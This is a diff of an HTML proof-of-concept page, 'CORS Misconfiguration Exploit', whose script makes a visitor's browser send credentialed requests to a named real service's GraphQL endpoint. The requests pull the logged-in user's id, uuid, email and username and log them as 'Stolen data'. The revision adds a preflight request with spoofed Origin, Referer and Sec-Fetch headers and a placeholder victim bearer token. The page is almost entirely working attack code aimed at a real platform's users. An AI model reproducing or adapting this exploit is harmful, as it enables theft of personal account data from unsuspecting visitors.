@@ -3,46 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exploit CORS Misconfiguration</title>
+    <title>CORS Misconfiguration Exploit</title>
     <script>
         window.onload = function() {
             // Add event listener for button click
             document.getElementById('exploitButton').addEventListener('click', function() {
-                // Create the request to exploit CORS misconfig
+                // Dynamically set Origin and Referer from the current page's URL
+                const origin = window.location.origin;  // Get the current origin (e.g., https://404ivan.github.io)
+                const referer = window.location.href;   // Get the current page's full URL
+
+                // First, let's trigger the OPTIONS request by using fetch
                 fetch('https://graph.linktr.ee/graphql', {
-                    method: 'POST',
+                    method: 'OPTIONS',
                     headers: {
-                        'Content-Type': 'application/json',
-                        // Add Authorization header if needed
-                        // 'Authorization': 'Bearer YOUR_VICTIM_TOKEN', // Uncomment if you have a token
+                        'Access-Control-Request-Method': 'POST',
+                        'Access-Control-Request-Headers': 'content-type, authorization', // Added authorization here
+                        'Origin': origin,   // Dynamic Origin
+                        'Referer': referer, // Dynamic Referer
+                        'Sec-Fetch-Mode': 'cors',
+                        'Sec-Fetch-Site': 'cross-site'
                     },
-                    body: JSON.stringify({
-                        query: `
-                            {
-                                currentUser {
-                                    id
-                                    uuid
-                                    email
-                                    username
-                                }
-                            }
-                        `
-                    }),
-                    credentials: 'include'  // Ensure that cookies or session data are included if necessary
+                    credentials: 'include'  // Include credentials if necessary
                 })
-                .then(response => response.json())
-                .then(data => {
-                    // If data is returned successfully, show the data
-                    if (data && data.data) {
-                        console.log("Stolen data:", data.data.currentUser);
-                        alert("Data retrieved: " + JSON.stringify(data.data.currentUser, null, 2));
-                    } else {
-                        alert("Failed to retrieve data, CORS misconfiguration might not exist.");
-                    }
+                .then(response => {
+                    // You can log the response headers to see the results of the preflight request
+                    console.log("Preflight request sent:", response);
+                    return response;
+                })
+                .then(() => {
+                    // Send the actual POST request once the OPTIONS request is complete
+                    fetch('https://graph.linktr.ee/graphql', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Authorization': 'Bearer [victim_token]',  // Replace with real token if available
+                            'Origin': origin,  // Dynamic Origin
+                        },
+                        body: JSON.stringify({
+                            query: `
+                                {
+                                    currentUser {
+                                        id
+                                        uuid
+                                        email
+                                        username
+                                    }
+                                }
+                            `
+                        }),
+                        credentials: 'include'  // Include credentials if necessary
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        // If the request is successful, show the user data in an alert
+                        if (data && data.data) {
+                            console.log("Stolen data:", data.data.currentUser);
+                            alert("Data retrieved: " + JSON.stringify(data.data.currentUser, null, 2));
+                        } else {
+                            alert("Failed to retrieve data.");
+                        }
+                    })
+                    .catch(err => {
+                        console.error("Error sending POST request:", err);
+                        alert("Error occurred: " + err.message);
+                    });
                 })
                 .catch(err => {
-                    console.error("Error:", err);
-                    alert("Error occurred: " + err.message);
+                    console.error("Error with OPTIONS request:", err);
+                    alert("Error occurred with OPTIONS request: " + err.message);
                 });
             });
         };
@@ -50,7 +78,7 @@
 </head>
 <body>
     <h1>CORS Misconfiguration Exploit</h1>
-    <p>Click the button to exploit the CORS misconfiguration and attempt to retrieve user data.</p>
+    <p>Click the button to send a CORS preflight and exploit the misconfiguration to retrieve user data.</p>
     <button id="exploitButton">Exploit CORS Misconfiguration</button>
 </body>
 </html>
